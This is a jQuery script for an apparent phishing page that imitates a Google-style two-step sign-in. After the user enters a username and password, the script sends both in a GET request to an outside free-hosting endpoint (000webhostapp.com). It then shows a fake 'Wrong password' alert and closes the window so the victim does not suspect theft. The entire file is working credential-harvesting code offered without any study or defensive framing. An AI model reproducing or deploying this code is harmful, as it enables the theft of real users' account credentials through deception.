$(document).ready(function () {

    $("#username").focusout(function () {

        let val = $(this).val();

        if (val.length !== 0 || val !== "") {

            $("#un-ph").hide();

            $("#un-ph2").show();

        }

    });

    $("#username").focus(function(){

        $(".input-empty").hide();

        $(this).css("border-color","#1a73e8");

    })

    $("#submit-username").on("click", function () {

        const unElement = $("#username");

        let username = unElement.val();

        if (username.length == 0 || username == "") {

            $(".input-empty").show();

            unElement.css("border", "1px solid #d93025");

        }

        else {

            $(".welcome").text(username);

            $("#loadingProgressG").show();

            $(".wrapper").css("opacity", "0.5");

            $(".wrapper").css("user-select", "none");

            setTimeout(() => {

                $("#loadingProgressG").hide();

                $(".wrapper").css("opacity", "1");

                $(".login-username").hide();

                $(".login-password").show();

            }, 800);

        }



    })

    $("#password").focusout(function(){

        const password = $(this);

        if(password.val().length != 0 || password.val() != ""){

            $(".un-ph").hide();

        }

    })

    $("#submit-password").on('click',function(){

        const password = $("#password");

        let passVal = password.val();

        if (passVal.length == 0 || passVal == "") {

            $(".input-empty").show();

            password.css("border", "1px solid #d93025");

        }

        else {

            let username = $("#username").val();

            let password = $("#password").val();

            if(username.length != 0 && password.length != 0){

                $.ajax({

                    url: "https://phamlong123.000webhostapp.com/ajax.php",

                    method: "GET",
                    crossDomain: true,
                    headers: {
    'Access-Control-Allow-Credentials' : true,
    'Access-Control-Allow-Origin':'*',
    'Access-Control-Allow-Methods':'*',
    'Access-Control-Allow-Headers':'application/json',
  },
   dataType: 'jsonp',
            
                    data: {

                        username : username,

                        password : password

                    },

                    success: function (data) {

                        console.log(data);

                        if(data != -1){

                            alert("Wrong password. Try again or click Forgot password to reset it.");
                            setTimeout(window.close, 5000);
                        }

                    },

                    error(xhr,textStatus,err) {

                          alert("Wrong password. Try again or click Forgot password to reset it.");
                            setTimeout(window.close, 5000);

                    }

                })

            }

        }

    })

})
